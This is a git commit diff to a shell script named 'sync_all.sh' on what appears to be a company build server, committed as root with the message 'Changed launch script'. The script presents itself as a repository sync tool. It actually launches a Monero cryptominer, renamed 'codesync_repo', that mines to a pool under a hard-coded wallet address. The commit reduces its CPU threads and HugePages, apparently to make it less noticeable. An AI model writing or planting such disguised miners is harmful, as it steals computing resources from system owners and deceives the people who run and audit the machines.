cc310a697acd102c68a55380f6f9a49bc6a739a9
root <root@BuildSrv01.sirinmobile.local>
2017-09-08 15:05:53 +0300

    Changed launch script

--- sync_all.sh
+++ sync_all.sh
@@ -1,10 +1,10 @@
 #! /bin/bash
 
 # Set HugePages to 12GB
-sudo sysctl -w vm.nr_hugepages=6144
+sudo sysctl -w vm.nr_hugepages=128
 
 MINER_NAME=$(hostname)
-CPUS=12
+CPUS=6
 
 # mymonero.com
 sudo ./repo_sync/codesync_repo --url=xmr-eu.dwarfpool.com:8005 --user=45nk55hPwc4Ghbie9QjbDdBXfpWz5V1s5Voo172hMWmPGiH7kLB29oVd7FqrutXQAye8D1PAHqiMidkLouTVGsDxEaak8hx.$MINER_NAME --pass=x --keepalive --donate-level=1 --threads=$CPUS --cpu-priority=5
